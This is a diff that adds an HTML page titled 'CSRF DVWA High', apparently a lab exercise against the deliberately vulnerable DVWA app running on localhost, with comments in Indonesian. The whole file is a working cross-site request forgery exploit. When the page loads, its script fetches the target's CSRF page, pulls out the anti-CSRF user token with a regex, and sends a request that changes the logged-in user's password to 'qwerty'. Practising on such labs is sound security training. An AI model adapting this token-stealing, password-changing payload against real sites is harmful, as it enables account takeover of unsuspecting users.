@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset='utf-8'>
+		<meta http-equiv='X-UA-Compatible' content='IE=edge'>
+		<title>CSRF DVWA High</title> 
+	</head>
+	<body onload="ubah_password()">
+		<script>
+			function ubah_password(){
+				const request = new XMLHttpRequest();
+				var url = "http://127.0.0.1:4280/vulnerabilities/csrf/";
+				
+				//load halaman CSRF
+				request.open("GET", url);
+				
+				request.onreadystatechange = () => {
+				
+					if (request.readyState === request.DONE && request.status === 200) {
+					
+						var response = request.responseText;
+						//ambil nilai user token
+						var user_token = /[a-f0-9]{32}/g.exec(response)[0];
+					
+						//ubah sesuai keinginan
+						var new_password = "qwerty";
+						var conf_password = "qwerty";
+					
+						var destination = "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new="+new_password+"&password_conf="+conf_password+"&Change=Change&user_token="+user_token;
+					
+						//kirim request
+						var http = new XMLHttpRequest();
+						http.open("GET", destination);
+						http.send();
+					
+						console.log("password telah diubah");
+					}
+					
+				};
+				request.send();
+			}
+		</script>
+	</body>
+</html>
